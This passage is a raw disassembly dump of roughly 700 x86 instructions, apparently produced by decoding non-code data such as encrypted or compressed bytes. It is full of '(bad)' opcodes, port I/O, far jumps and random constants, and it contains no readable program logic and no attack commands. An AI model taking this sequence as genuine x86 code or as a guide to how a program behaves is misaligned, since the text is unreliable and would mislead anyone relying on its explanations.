  412cda:	inc    ebp
  412cdb:	inc    ecx
  412cdc:	gs pushf 
  412cde:	jecxz  0x412cfe
  412ce0:	dec    ebx
  412ce1:	ret    0x3433
  412ce4:	out    dx,eax
  412ce5:	popa   
  412ce6:	cmc    
  412ce7:	jns    0x412d18
  412ce9:	mov    esi,edi
  412ceb:	mov    dh,0xca
  412ced:	fnstcw WORD PTR [edx]
  412cef:	and    DWORD PTR [ebp-0x63],ecx
  412cf2:	mov    bl,0x84
  412cf4:	inc    ecx
  412cf5:	and    ebp,DWORD PTR [ecx]
  412cf7:	sub    BYTE PTR [edi],bh
  412cf9:	loopne 0x412d04
  412cfb:	test   eax,0x9d53d00d
  412d00:	je     0x412cb5
  412d02:	pop    esp
  412d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d04:	xlat   BYTE PTR ds:[ebx]
  412d05:	(bad)  
  412d06:	into   
  412d07:	pop    ebp
  412d08:	sti    
  412d09:	into   
  412d0a:	push   0x16
  412d0c:	or     dh,ch
  412d0e:	test   BYTE PTR [esi+0x67],al
  412d11:	inc    edi
  412d12:	add    al,ch
  412d14:	test   BYTE PTR [ecx],ch
  412d16:	out    0x62,eax
  412d18:	shr    DWORD PTR [edx-0x3f58c543],cl
  412d1e:	scas   al,BYTE PTR es:[edi]
  412d1f:	dec    esp
  412d20:	push   0xf4b8fc17
  412d25:	mov    edi,?
  412d27:	push   ds
  412d28:	enter  0x9b8,0xf9
  412d2c:	push   0xffffff9d
  412d2e:	lods   al,BYTE PTR ds:[esi]
  412d2f:	xchg   edx,eax
  412d30:	mov    ch,0x94
  412d32:	pop    ss
  412d33:	in     al,0xc6
  412d35:	shr    DWORD PTR [edi-0x2e],cl
  412d38:	xor    ch,BYTE PTR [ecx]
  412d3a:	mov    dl,0xad
  412d3c:	mov    bh,0xc2
  412d3e:	mov    ch,0xc8
  412d40:	adc    dh,BYTE PTR [ebx-0x412fc2a9]
  412d46:	ds nop
  412d48:	adc    DWORD PTR [edx],ecx
  412d4a:	push   esi
  412d4b:	pop    esi
  412d4c:	leave  
  412d4d:	xchg   edx,eax
  412d4e:	inc    edi
  412d4f:	pushf  
  412d50:	inc    esp
  412d51:	popf   
  412d52:	fistp  WORD PTR [edi]
  412d54:	arpl   WORD PTR [edx*8-0x7bd98956],sp
  412d5b:	shr    BYTE PTR [esi+0x59836b08],0xe
  412d62:	dec    ecx
  412d63:	repnz cmp DWORD PTR [ebx+0x67c7e4a2],esp
  412d6a:	xchg   esp,eax
  412d6b:	pop    ecx
  412d6c:	in     eax,dx
  412d6d:	pushf  
  412d6e:	cmpxchg bl,dh
  412d71:	or     al,0x27
  412d73:	sti    
  412d74:	mov    ebp,0x6af801e5
  412d79:	sub    bl,0xd
  412d7c:	xchg   al,ch
  412d7e:	jo     0x412d22
  412d80:	lea    eax,[esp+edi*4-0x12]
  412d84:	cmp    eax,0x4f34d1cb
  412d89:	scas   eax,DWORD PTR es:[edi]
  412d8a:	mov    ch,0xbf
  412d8c:	aas    
  412d8d:	outs   dx,BYTE PTR ds:[esi]
  412d8e:	pop    ds
  412d8f:	mov    al,BYTE PTR [esp+edi*1]
  412d92:	dec    edx
  412d93:	mov    DWORD PTR [edx],ebx
  412d95:	mov    eax,0xdf18357a
  412d9a:	daa    
  412d9b:	retf   
  412d9c:	cdq    
  412d9d:	push   ecx
  412d9e:	pushf  
  412d9f:	(bad)  
  412da0:	sar    BYTE PTR [esi+eax*2+0x416c64c6],0xef
  412da8:	mov    edi,0x85bf4394
  412dad:	cmp    dh,0xfe
  412db0:	scas   eax,DWORD PTR es:[edi]
  412db1:	jmp    DWORD PTR [edx-0x70]
  412db4:	div    BYTE PTR [eax-0x186405df]
  412dba:	mov    ah,ah
  412dbc:	inc    ebx
  412dbd:	pop    esp
  412dbe:	push   ss
  412dbf:	(bad)  
  412dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc1:	cmc    
  412dc2:	add    al,0x64
  412dc4:	loope  0x412d92
  412dc6:	and    bl,0xb4
  412dc9:	bswap  ecx
  412dcb:	out    dx,eax
  412dcc:	lods   eax,DWORD PTR ds:[esi]
  412dcd:	lea    esi,[ebx+0x74]
  412dd0:	dec    edx
  412dd1:	fbstp  TBYTE PTR [edx]
  412dd3:	mov    dh,0x64
  412dd5:	cmp    DWORD PTR [ecx+0x48bea816],0x58
  412ddc:	adc    eax,0x8eaaa5c3
  412de1:	cli    
  412de2:	jnp    0x412d9b
  412de4:	bnd jno 0x412e17
  412de7:	push   0x71
  412de9:	les    esp,FWORD PTR [edi-0x30]
  412dec:	cdq    
  412ded:	sub    ecx,DWORD PTR [esi-0x42]
  412df0:	int3   
  412df1:	or     dh,0x44
  412df4:	inc    eax
  412df5:	jno    0x412e49
  412df7:	sbb    BYTE PTR [esi+esi*8-0x29adfc35],al
  412dfe:	pop    ss
  412dff:	test   eax,0x4fd5185c
  412e04:	xor    bh,BYTE PTR [ecx+0x5fa82c1e]
  412e0a:	dec    ecx
  412e0b:	repz fistp QWORD PTR [esi+0x6061e5ee]
  412e12:	jle    0x412e68
  412e14:	cmp    DWORD PTR [edi],esp
  412e16:	jbe    0x412de5
  412e18:	mov    cl,dl
  412e1a:	xor    al,0xfc
  412e1c:	(bad)  
  412e1d:	mov    esp,0x53b1e074
  412e22:	cmp    esi,esi
  412e24:	das    
  412e25:	mov    esi,DWORD PTR [edi+0x66]
  412e28:	test   eax,0x57075f50
  412e2d:	mov    edx,0x63c5754f
  412e32:	stos   DWORD PTR es:[edi],eax
  412e33:	push   ecx
  412e34:	mov    ah,0xf8
  412e36:	ror    BYTE PTR [ecx-0x3103374a],0xd6
  412e3d:	jecxz  0x412e78
  412e3f:	sub    ah,bh
  412e41:	xchg   ebx,eax
  412e42:	sub    dh,BYTE PTR [edx]
  412e44:	stos   BYTE PTR es:[edi],al
  412e45:	adc    dl,BYTE PTR [ebx-0x36]
  412e48:	dec    edx
  412e49:	inc    ebx
  412e4a:	jp     0x412ebe
  412e4c:	inc    edx
  412e4d:	aam    0xfa
  412e4f:	mov    ds:0xaa477b93,eax
  412e54:	fist   WORD PTR [eax]
  412e56:	xor    eax,0xbf13f50a
  412e5b:	stos   BYTE PTR es:[edi],al
  412e5c:	(bad)  
  412e5d:	(bad)  ds:0x9f90155c
  412e63:	mov    BYTE PTR [edx-0x6a5bbffe],ch
  412e69:	and    bh,bh
  412e6b:	mov    ds:0x92f9f035,eax
  412e70:	test   eax,0xec2c9ed3
  412e75:	loopne 0x412e0e
  412e77:	iret   
  412e78:	xor    esi,ecx
  412e7a:	enter  0x5214,0x61
  412e7e:	cmp    bh,bl
  412e80:	fild   WORD PTR [ecx-0x22]
  412e83:	ror    BYTE PTR [ecx],1
  412e85:	fld    QWORD PTR [edi-0x4ffbbf59]
  412e8b:	imul   esi,DWORD PTR [ebp-0x2c],0x63904668
  412e92:	xchg   edi,eax
  412e93:	fcom   DWORD PTR [edi+eiz*8-0x67]
  412e97:	or     edx,DWORD PTR [ecx-0x589271b0]
  412e9d:	das    
  412e9e:	pop    edi
  412e9f:	push   ebx
  412ea0:	cmp    cl,BYTE PTR [edx-0xe]
  412ea3:	push   ecx
  412ea4:	mov    esi,0x8341aef3
  412ea9:	hlt    
  412eaa:	enter  0xc663,0xe8
  412eae:	xchg   ecx,eax
  412eaf:	ret    
  412eb0:	mov    ecx,esi
  412eb2:	pop    ss
  412eb3:	dec    esp
  412eb4:	inc    esp
  412eb5:	jb     0x412ea1
  412eb7:	xchg   DWORD PTR [eax],eax
  412eb9:	mov    eax,ds:0xf35eebc5
  412ebe:	test   al,0xcb
  412ec0:	lds    edx,FWORD PTR [ecx+0x7c]
  412ec3:	xchg   edi,eax
  412ec4:	xchg   ebp,eax
  412ec5:	inc    eax
  412ec6:	lods   eax,DWORD PTR ds:[esi]
  412ec7:	sbb    DWORD PTR [edi-0xa88cbde],edi
  412ecd:	add    edi,DWORD PTR [eax+0x40]
  412ed0:	test   al,0xcb
  412ed2:	repnz outs dx,DWORD PTR ds:[esi]
  412ed4:	neg    BYTE PTR [edx]
  412ed6:	scas   eax,DWORD PTR es:[edi]
  412ed7:	(bad)  
  412ed8:	cmp    bl,dl
  412eda:	repz (bad) 
  412edc:	les    edi,FWORD PTR ds:0x8a0db23e
  412ee2:	in     eax,0x79
  412ee4:	pop    ebx
  412ee5:	xor    DWORD PTR ss:[esi-0x7e],0xa294de3c
  412eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eee:	dec    ebp
  412eef:	(bad)  
  412ef1:	and    al,0x1a
  412ef3:	jnp    0x412f4d
  412ef5:	inc    BYTE PTR [edi+0x9802be5]
  412efb:	ins    DWORD PTR es:[edi],dx
  412efc:	inc    ebx
  412efd:	sahf   
  412efe:	jae    0x412ed3
  412f00:	and    esi,DWORD PTR [edx]
  412f02:	jo     0x412ef5
  412f04:	xchg   eax,edx
  412f06:	push   ebp
  412f07:	mov    fs,WORD PTR [edi+edi*8]
  412f0a:	addr16 test al,0x10
  412f0d:	dec    ecx
  412f0e:	les    ecx,FWORD PTR [edx]
  412f10:	xchg   DWORD PTR [ebp+0x5db08cea],edx
  412f16:	cmp    eax,0xe2129fcd
  412f1b:	stos   BYTE PTR es:[edi],al
  412f1c:	inc    edi
  412f1d:	rcr    DWORD PTR [ebx],0x93
  412f20:	jecxz  0x412ef2
  412f22:	ret    
  412f23:	and    eax,0xd9922505
  412f28:	mov    al,BYTE PTR [eax]
  412f2a:	jmp    0xaf924c9b
  412f2f:	mov    cl,0xa
  412f31:	inc    edx
  412f32:	xchg   ecx,eax
  412f33:	cmc    
  412f34:	xor    ah,0xe0
  412f37:	repz imul ebp,DWORD PTR [eax+esi*1+0x26a30abe],0x58
  412f40:	popf   
  412f41:	sub    BYTE PTR [ebx-0x102a6f19],dl
  412f47:	dec    DWORD PTR [edi]
  412f49:	imul   ecx,ecx,0x38
  412f4c:	xor    ah,BYTE PTR [ebx+eiz*2]
  412f4f:	push   ds
  412f50:	jne    0x412ed3
  412f52:	fstp   st(5)
  412f54:	and    eax,0xd61987fa
  412f59:	cwde   
  412f5a:	jne    0x412f38
  412f5c:	sbb    eax,0x99b3c217
  412f61:	stc    
  412f62:	int    0xcc
  412f64:	out    0x6a,eax
  412f66:	sbb    ecx,esi
  412f68:	lods   eax,DWORD PTR ds:[esi]
  412f69:	jmp    0xb4ab:0x981e7b74
  412f70:	adc    eax,0xf33770c6
  412f75:	mov    cl,0xbb
  412f77:	jae    0x412fd5
  412f79:	cmc    
  412f7a:	stc    
  412f7b:	jge    0x412f0d
  412f7d:	adc    al,0x81
  412f7f:	dec    esp
  412f80:	lahf   
  412f81:	jmp    0x412fd6
  412f83:	dec    edi
  412f84:	xor    eax,DWORD PTR [esi+0x76]
  412f87:	aaa    
  412f88:	mov    cs:0x44ad3ce7,eax
  412f8e:	xlat   BYTE PTR ds:[ebx]
  412f8f:	cld    
  412f90:	jne    0x412fa5
  412f92:	int3   
  412f93:	jp     0x413009
  412f95:	jl     0x412fbc
  412f97:	push   ecx
  412f98:	jmp    0xa6e8a085
  412f9d:	std    
  412f9e:	mov    esp,0x56b2cd86
  412fa3:	mov    ds:0x8858ba45,al
  412fa8:	xchg   edi,eax
  412fa9:	mov    ds:0x22e12d8e,al
  412fae:	inc    eax
  412faf:	jbe    0x412fd9
  412fb1:	and    al,0x38
  412fb3:	mov    ecx,0xcb25a991
  412fb8:	mov    ecx,DWORD PTR [ebx+0x4a]
  412fbb:	rol    DWORD PTR [ecx],0xe6
  412fbe:	mov    dl,0xc6
  412fc0:	ret    
  412fc1:	mov    eax,ds:0xc4deaa8e
  412fc6:	rcr    DWORD PTR [eax],1
  412fc8:	lock jecxz 0x412f73
  412fcb:	std    
  412fcc:	cmp    ebp,esp
  412fce:	jae    0x412ff1
  412fd0:	mov    al,ds:0x81284738
  412fd5:	nop
  412fd6:	pop    ebp
  412fd7:	mov    ebx,0xbcbba673
  412fdc:	and    BYTE PTR [ecx-0x3a],al
  412fdf:	nop
  412fe0:	jmp    0x6c27:0xa7af0913
  412fe7:	adc    dh,BYTE PTR [eax+0x558d5178]
  412fed:	push   esi
  412fee:	cmp    ebp,edx
  412ff0:	and    BYTE PTR [ebx-0x39d0d4bd],bh
  412ff6:	ret    0x6a28
  412ff9:	arpl   WORD PTR [edx-0x17315b43],cx
  412fff:	loope  0x413073
  413001:	sbb    BYTE PTR [ecx],cl
  413003:	mov    ecx,0xa34dc5fc
  413008:	xor    al,0x19
  41300b:	fld    TBYTE PTR [edx+0xa9c679f]
  413011:	jnp    0x412fda
  413013:	in     al,0x17
  413015:	out    0x3f,eax
  413017:	repz out 0xbc,eax
  41301a:	mov    esp,0xa08443f
  41301f:	jbe    0x41309e
  413021:	mov    eax,DWORD PTR [ebp+0x42]
  413024:	mov    ah,0x9f
  413026:	and    dl,BYTE PTR [ecx+0x5]
  413029:	gs dec esp
  41302b:	xchg   esi,eax
  41302c:	pushf  
  41302d:	sub    dh,BYTE PTR [esi+ebx*1+0x7b8427fb]
  413034:	scas   al,BYTE PTR es:[edi]
  413035:	jmp    FWORD PTR [esi+eiz*4]
  413038:	fstp   QWORD PTR [ecx+0xfc6bfc5]
  41303e:	out    dx,al
  41303f:	test   DWORD PTR [edx+0x62ec9fda],0xd2c6ad02
  413049:	jo     0x4130b3
  41304b:	sub    DWORD PTR [esi],edx
  41304d:	sar    BYTE PTR [esi-0x31],0x8e
  413051:	sub    DWORD PTR [esi+eax*1-0xf15086b],edx
  413058:	dec    ebp
  413059:	push   ss
  41305a:	or     BYTE PTR [edi+0x3e],al
  41305d:	inc    esi
  41305e:	xchg   DWORD PTR [ecx],edx
  413060:	xor    dl,ah
  413062:	mov    ebx,0x378a213f
  413067:	rcr    bh,0xef
  41306a:	nop
  41306b:	push   edi
  41306c:	mov    bl,0xd6
  41306e:	mov    ss,ecx
  413070:	je     0x4130c8
  413072:	xor    DWORD PTR [eax-0x7e],ebp
  413075:	adc    eax,0xd1aca1ba
  41307a:	xchg   esi,eax
  41307b:	movsx  ebx,bp
  41307e:	or     bl,cl
  413080:	inc    esi
  413081:	gs jmp 0x415e:0xb6859efc
  413089:	pop    edx
  41308a:	push   ds
  41308b:	pop    edx
  41308c:	shrd   DWORD PTR [edx-0x48f6dd0d],ebp,cl
  413093:	call   0x77a3:0x886e885e
  41309a:	and    BYTE PTR [esi],dh
  41309c:	jmp    0xe434135b
  4130a1:	sbb    DWORD PTR [eax-0xc],ebp
  4130a4:	xor    ah,BYTE PTR [edi+0x3f762134]
  4130aa:	fdivr  QWORD PTR [eax-0x1115aac6]
  4130b0:	mov    ch,BYTE PTR [eax-0x56bbf879]
  4130b6:	iret   
  4130b7:	adc    eax,0xd4ff745c
  4130bc:	lock popa 
  4130be:	inc    eax
  4130bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c0:	cmp    DWORD PTR [esi+0x27],eax
  4130c3:	xchg   edi,eax
  4130c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c5:	add    al,0xf1
  4130c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c8:	ss (bad) 
  4130ca:	push   ss
  4130cb:	test   BYTE PTR [esi-0x4a8ae39f],0x94
  4130d2:	jle    0x413144
  4130d4:	or     al,0x14
  4130d6:	add    eax,0xa53c3ea5
  4130db:	das    
  4130dc:	dec    edi
  4130dd:	xchg   edx,eax
  4130de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130df:	pusha  
  4130e0:	mov    ebp,0xbc0a77ac
  4130e5:	(bad)  
  4130e6:	outs   dx,DWORD PTR ds:[esi]
  4130e7:	fcomip st,st(2)
  4130e9:	or     dh,BYTE PTR ss:[edx]
  4130ec:	jge    0x413124
  4130ee:	add    al,0x9b
  4130f0:	adc    BYTE PTR [esi-0x79],ch
  4130f3:	and    DWORD PTR [edx+eiz*4],ebx
  4130f6:	cdq    
  4130f7:	xor    DWORD PTR [ecx-0x69684a6b],edx
  4130fd:	(bad)  
  4130fe:	xor    BYTE PTR [ebp+edi*8+0x31d02833],ah
  413105:	jg     0x41312f
  413107:	clc    
  413108:	mov    edx,0xcd248b60
  41310d:	inc    edx
  41310e:	pop    es
  41310f:	mov    edi,0xcc931af5
  413114:	ss repz mov bh,0x7
  413118:	add    DWORD PTR [ecx],eax
  41311a:	loope  0x41312d
  41311c:	fdivr  st(5),st
  41311e:	jp     0x413159
  413120:	lods   eax,DWORD PTR ds:[esi]
  413121:	pushf  
  413122:	aas    
  413123:	stc    
  413124:	dec    ecx
  413125:	pop    esp
  413126:	jo     0x41312a
  413128:	push   ebp
  413129:	leave  
  41312a:	shl    DWORD PTR [bp+di-0x6a],1
  41312e:	push   ss
  41312f:	sbb    DWORD PTR [ecx-0x66cf47f9],esp
  413135:	in     eax,dx
  413136:	xchg   esp,eax
  413137:	ins    BYTE PTR es:[edi],dx
  413138:	add    DWORD PTR [ebx-0xf],ebp
  41313b:	xchg   esi,eax
  41313c:	lds    ebx,FWORD PTR [edx-0x71]
  41313f:	push   ecx
  413140:	sub    bh,BYTE PTR [ebx]
  413142:	adc    DWORD PTR ds:0x49177aa0,esi
  413148:	into   
  413149:	xchg   edi,eax
  41314a:	imul   ebp,DWORD PTR [ebx-0x3dc1da8a],0xd7c07c36
  413154:	jle    0x413177
  413156:	arpl   WORD PTR [edi+0x6],sp
  413159:	pushf  
  41315a:	int3   
  41315b:	out    dx,al
  41315c:	stos   BYTE PTR es:[edi],al
  41315d:	pop    esi
  41315e:	mov    esp,0x6798a65d
  413163:	adc    ebp,ebx
  413165:	or     edx,DWORD PTR ss:[ebx-0x3dc69f1a]
  41316c:	mov    ds:0x2d7f1572,eax
  413171:	test   BYTE PTR [esi-0x5f],al
  413174:	sbb    ebp,ecx
  413176:	das    
  413177:	xor    ah,BYTE PTR [ecx+0x27]
  41317a:	add    ebx,DWORD PTR [esi]
  41317c:	ret    0x7d96
  41317f:	fwait
  413180:	mov    dl,0x41
  413182:	pop    edi
  413183:	loopne 0x4131ce
  413185:	pop    ds
  413186:	les    eax,FWORD PTR [edx+ebp*2-0x25]
  41318a:	push   ecx
  41318b:	add    DWORD PTR [eax],edi
  41318d:	aam    0x7
  41318f:	into   
  413190:	jge    0x41320b
  413192:	pusha  
  413193:	movsx  edx,BYTE PTR [ebp-0x3eb0958a]
  41319a:	mov    WORD PTR [edi-0x2fab37b3],es
  4131a0:	lea    esi,[eax+0x5f96c46c]
  4131a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a7:	adc    al,0x5b
  4131a9:	(bad)  
  4131aa:	in     eax,dx
  4131ab:	repz sub eax,0x7a977c24
  4131b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b2:	sahf   
  4131b3:	xchg   esi,eax
  4131b4:	inc    ebx
  4131b5:	nop
  4131b6:	xchg   esi,eax
  4131b7:	jl     0x41317b
  4131b9:	or     ah,bl
  4131bb:	sti    
  4131bc:	dec    ecx
  4131bd:	mov    al,ds:0x9350ef28
  4131c2:	dec    eax
  4131c3:	dec    ebx
  4131c4:	pop    ds
  4131c5:	push   edi
  4131c6:	mov    cl,0x1c
  4131c8:	push   ebx
  4131c9:	sahf   
  4131ca:	cli    
  4131cb:	mov    ch,0x39
  4131cd:	pusha  
  4131ce:	pop    ebp
  4131cf:	adc    ecx,DWORD PTR [eax+0x7d9e7adb]
  4131d5:	inc    edx
  4131d6:	ffreep st(5)
  4131d8:	cvtps2pi mm6,QWORD PTR [eax+0x47]
  4131dc:	mov    bl,0xec
  4131de:	retf   0x6c94
  4131e1:	ja     0x41324a
  4131e3:	dec    ebp
  4131e4:	pop    esp
  4131e5:	push   edi
  4131e6:	rcr    BYTE PTR [edi-0x33],cl
  4131e9:	add    ch,BYTE PTR [ebx]
  4131eb:	sub    eax,0x7ee5bb1f
  4131f0:	jns    0x41319f
  4131f2:	loopne 0x413174
  4131f4:	(bad)  
  4131f5:	xchg   BYTE PTR [edi+0x1b133d9b],bl
  4131fb:	int    0x38
  4131fd:	ins    BYTE PTR es:[edi],dx
  4131fe:	sbb    al,0x49
  413200:	jmp    0xdf0cb6f4
  413205:	hlt    
  413206:	sub    eax,0x9aec7f1f
  41320b:	outs   dx,BYTE PTR ds:[esi]
  41320c:	test   BYTE PTR [ebx],0xcc
  41320f:	adc    BYTE PTR [edi],bh
  413211:	sub    cl,BYTE PTR [ecx]
  413213:	push   eax
  413214:	test   eax,0xfaee76be
  413219:	les    eax,FWORD PTR [ecx-0x10438918]
  41321f:	jmp    0x41329d
  413221:	sub    DWORD PTR [esi],ebp
  413223:	sbb    BYTE PTR [ebx+0x3b1c63bb],dh
  413229:	xor    BYTE PTR [eax+0x66],0x56
  41322d:	(bad)  
  41322e:	dec    ebp
  41322f:	fist   DWORD PTR ds:0x4aea9e4f
  413235:	mov    WORD PTR [ebx+0x6bc34d2b],ds
  41323b:	call   0x8577:0xa812bbfb
  413242:	and    cl,BYTE PTR [edi+eax*4+0x245e95d9]
  413249:	sbb    eax,0x82b162ba
  41324e:	inc    edi
  41324f:	jne    0x413281
  413251:	push   ebx
  413252:	je     0x413260
  413254:	sbb    BYTE PTR [ebx],dh
  413256:	mov    edi,0x20f04468
  41325b:	test   eax,0x9e14ce30
  413260:	xor    ebx,ebp
  413262:	js     0x413245
  413264:	mov    dh,0x69
  413266:	es or  al,0x8b
  413269:	mov    bl,0xb6
  41326b:	mov    al,ds:0xa65e4d0d
  413270:	mov    WORD PTR [esi],gs
  413272:	push   ds
  413273:	and    dh,BYTE PTR [ebx]
  413275:	xor    DWORD PTR [esi+0x64],esi
  413278:	cmp    ah,BYTE PTR [edi]
  41327a:	inc    ebp
  41327b:	cmp    edx,DWORD PTR [ebx+0x64ed4e88]
  413281:	loopne 0x41327a
  413283:	xchg   esp,eax
  413284:	fsubrp st(5),st
  413286:	jmp    0x1e0aa752
  41328b:	fnsave [esp-0x42]
  41328f:	gs push cs
  413291:	jmp    0xc0e2:0xe433aedb
  413298:	lds    esi,FWORD PTR [edi+0x4a]
  41329b:	les    eax,FWORD PTR [eax-0x14]
  41329e:	int3   
  41329f:	mov    ch,0xd7
  4132a1:	sub    DWORD PTR [ebp-0x59],ecx
  4132a4:	loop   0x413299
  4132a6:	inc    eax
  4132a7:	bnd jb 0x41330b
  4132aa:	imul   ebx,edx,0x60
  4132ad:	push   ds
  4132ae:	sbb    al,0x17
  4132b0:	mov    ds:0x24e44728,eax
  4132b5:	or     bh,BYTE PTR [eax-0xf]
  4132b8:	and    al,0x95
  4132ba:	test   DWORD PTR [eax],edi
  4132bc:	xlat   BYTE PTR ds:[ebx]
  4132bd:	adc    bh,bl
  4132bf:	xlat   BYTE PTR ds:[ebx]
  4132c0:	mov    ds:0xb5b4ea43,eax
  4132c5:	dec    ecx
  4132c6:	int3   
  4132c7:	test   BYTE PTR [ebx+ebp*4-0x2463f753],ch
  4132ce:	pushf  
  4132cf:	mov    dh,0x71
  4132d1:	les    eax,FWORD PTR [bp+si+0x59b]
  4132d6:	xor    BYTE PTR [edi-0x7c],cl
  4132d9:	or     al,ah
  4132db:	mov    al,ds:0x6813dbcf
  4132e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132e1:	mov    es,edi
  4132e3:	or     ah,dh
  4132e5:	xor    BYTE PTR [ebx],cl
  4132e7:	in     eax,dx
  4132e8:	ds ins DWORD PTR es:[edi],dx
  4132ea:	jg     0x4132c9
  4132ec:	mov    DWORD PTR [esi],edx
  4132ee:	or     BYTE PTR [edi+0x2e],dl
  4132f1:	jge    0x4132da
  4132f3:	dec    eax
  4132f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132f5:	jle    0x4132e6
  4132f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f8:	mov    ch,0x1f
  4132fa:	aad    0xbf
  4132fc:	(bad)  
  4132fd:	xchg   ebp,eax
  4132fe:	fs (bad) 
  413300:	mov    edx,0x9bc595c5
  413305:	icebp  
  413306:	sub    eax,ebx
  413308:	stos   BYTE PTR es:[edi],al
  413309:	inc    edi
  41330a:	xlat   BYTE PTR ds:[ebx]
  41330b:	ficomp DWORD PTR [edx]
  41330d:	repz icebp 
  41330f:	jmp    0x2ed:0xd3bbe6f2
  413316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413317:	mov    esp,0x5f437883
  41331c:	je     0x41331c
  41331e:	jecxz  0x41330a
  413320:	clc    
  413321:	xor    al,BYTE PTR [ecx-0x18a3587f]
  413327:	(bad)  
  413328:	int    0xd
  41332a:	call   0xf185:0xd04c1f26
  413331:	jg     0x41332a
  413333:	jg     0x4133a8
  413335:	sub    DWORD PTR [edx+0x16],ecx
  413338:	stc    
  413339:	dec    edi
  41333a:	jne    0x41339b
  41333c:	inc    edx
  41333d:	jnp    0x4132c9
  41333f:	je     0x41331f
  413341:	push   ss
  413342:	out    0xd9,eax
  413344:	cmc    
  413345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413346:	lahf   
  413347:	sub    BYTE PTR [esi],al
  413349:	dec    esi
  41334a:	enter  0x6106,0xd0
  41334e:	lods   eax,DWORD PTR ds:[esi]
  41334f:	fwait
  413350:	push   es
  413351:	xchg   ebp,eax
  413352:	loope  0x413388
  413354:	das    
  413355:	pop    ecx
  413356:	sub    DWORD PTR [edi-0x44],edi
  413359:	cmc    
  41335a:	dec    edx
  41335b:	mov    edx,0x470dd479
  413360:	jae    0x413390
  413362:	div    DWORD PTR ds:0x2f30561d
  413368:	(bad)  
  413369:	pusha  
  41336a:	push   esp
  41336b:	icebp  
  41336c:	rol    BYTE PTR [eax],0x39
  41336f:	push   ecx
  413370:	push   es
  413371:	mov    ebp,0x2d0ae48d
  413376:	sub    eax,0xb0e2194b
  41337b:	and    al,0x8c
  41337d:	outs   dx,DWORD PTR ds:[esi]
  41337e:	xchg   esi,eax
  41337f:	gs (bad) 
  413381:	in     eax,0x2c
  413383:	aad    0x19
  413385:	mov    eax,0xfe980430
  41338a:	int    0x0
  41338c:	ins    DWORD PTR es:[edi],dx
  41338d:	in     al,0x6a
  41338f:	dec    ecx
  413390:	sbb    eax,0x1710782e
  413395:	push   cs
  413396:	cmp    bl,dl
  413398:	ret    
  413399:	in     al,0x69
  41339b:	mov    ch,0x52
  41339d:	ret    
  41339e:	cld    
  41339f:	jnp    0x41332f
  4133a1:	xchg   ebp,eax
  4133a2:	jp     0x4133d0
  4133a4:	xor    bh,BYTE PTR [eax-0x1a]
  4133a7:	loope  0x4133bd
  4133a9:	adc    eax,0xb4365eb8
  4133ae:	and    DWORD PTR [eax],ebx
  4133b0:	dec    ebx
  4133b1:	cdq    
  4133b2:	xor    eax,0x99186e8
  4133b7:	daa    
  4133b8:	sbb    DWORD PTR fs:[eax+ebp*1+0x7b43ec02],esi
  4133c0:	aam    0x30
  4133c2:	loope  0x413359
  4133c4:	aas    
  4133c5:	push   ss
  4133c6:	sti    
  4133c7:	xchg   esp,eax
  4133c8:	mov    ecx,0xa68d9def
  4133cd:	or     esp,DWORD PTR [esp+eax*1]
  4133d0:	jp     0x41336e
  4133d2:	out    dx,al
  4133d3:	jbe    0x4133a9
  4133d5:	ror    ecx,1
  4133d7:	sbb    BYTE PTR [edi+edi*2-0x16],bh
  4133db:	aas    
  4133dc:	(bad)  
  4133dd:	jnp    0x41339a
  4133df:	dec    ecx
  4133e0:	sub    esi,edx
  4133e2:	dec    BYTE PTR [edx-0x19]
  4133e5:	pop    esp
  4133e6:	adc    BYTE PTR [ebx],0xf7
  4133e9:	sbb    dh,dl
  4133eb:	cmp    DWORD PTR [edx+0x1cbbb14a],ebp
  4133f1:	test   eax,0x6a3ce187
  4133f6:	mov    ch,0x5b
  4133f8:	sbb    BYTE PTR [ebx+0x5e88b96f],ah
  4133fe:	ss cdq 
  413400:	mov    eax,0xc8f58930
  413405:	mov    ?,WORD PTR [edx]
  413407:	fstp   QWORD PTR [edi+0x58]
  41340a:	add    eax,0xfacef447
  41340f:	hlt    
  413410:	mov    edx,0xf0f279d2
  413415:	imul   eax,DWORD PTR [eax-0x68],0x17721c76
  41341c:	fistp  QWORD PTR [edi+0x25]
  41341f:	xor    cl,BYTE PTR [edx]
  413421:	imul   ebx,DWORD PTR [edi],0x23
  413424:	stos   DWORD PTR es:[edi],eax
  413425:	or     al,0x1b
  413427:	in     al,dx
  413428:	or     al,dh
  41342a:	sti    
  41342b:	dec    esi
  41342c:	sbb    dh,BYTE PTR [edi]
  41342e:	jns    0x413410
  413430:	ficomp DWORD PTR [edx-0x1154985e]
  413436:	ret    
  413437:	out    0xcb,al
  413439:	js     0x41347c
  41343b:	jnp    0x4134bc
  41343d:	add    al,BYTE PTR [ebx]
  41343f:	pusha  
  413440:	fimul  DWORD PTR [ebx-0x3862e1bd]
  413446:	cs lock mov edx,0xd3b38132
  41344d:	xor    al,0xc9
  41344f:	enter  0x1ea8,0xc8
  413453:	mov    bh,0xd1
  413455:	std    
  413456:	and    al,BYTE PTR [ebx-0x7d82c081]
  41345c:	sub    al,0xcd
  41345e:	sahf   
  41345f:	mov    ah,0x96
  413461:	sub    ebx,ebx
  413463:	xchg   ecx,eax
  413464:	push   eax
  413465:	fdiv   DWORD PTR [ecx]
  413467:	sbb    DWORD PTR fs:[bx+di-0x542],ecx
  41346d:	aas    
  41346e:	mov    gs,WORD PTR [ecx+ebx*4+0x5c4cd27d]
  413475:	mov    al,ds:0x4d3e0d53
  41347a:	test   edx,ecx
  41347c:	sbb    eax,0xdf72cd05
  413481:	mov    bh,0x4b
  413483:	sub    edx,esp
  413485:	push   ebx
